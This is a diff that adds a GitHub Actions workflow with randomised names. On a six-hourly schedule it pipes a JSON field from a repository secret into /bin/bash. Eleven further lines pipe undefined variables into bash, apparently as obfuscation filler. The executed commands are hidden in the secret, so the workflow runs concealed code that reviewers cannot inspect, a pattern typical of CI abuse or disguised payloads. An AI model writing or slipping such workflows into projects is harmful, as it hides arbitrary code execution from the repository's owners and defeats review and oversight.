@@ -1,0 +1,27 @@
+name: hongsanhunbi
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '44 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: hongsanhunbi
+        env:
+          iptz0: ${{ secrets.iptz0 }}
+        run: |
+          echo $iptz0 | jq -r .qkd7 | /bin/bash
+          echo $e176 | jq -r .otjoo04347 | /bin/bash
+          echo $s85 | jq -r .xtg55 | /bin/bash
+          echo $rth74 | jq -r .exqrk309 | /bin/bash
+          echo $vyped3 | jq -r .wda2 | /bin/bash
+          echo $zktle235 | jq -r .lwsnd6628 | /bin/bash
+          echo $wmt1797 | jq -r .ifi1276 | /bin/bash
+          echo $lnq25538 | jq -r .pt3 | /bin/bash
+          echo $sqbvd67399 | jq -r .epfgj3655 | /bin/bash
+          echo $aimce2 | jq -r .otzb4 | /bin/bash
+          echo $xr05 | jq -r .qrdk9585 | /bin/bash
+          echo $pxry50 | jq -r .f38244 | /bin/bash
+
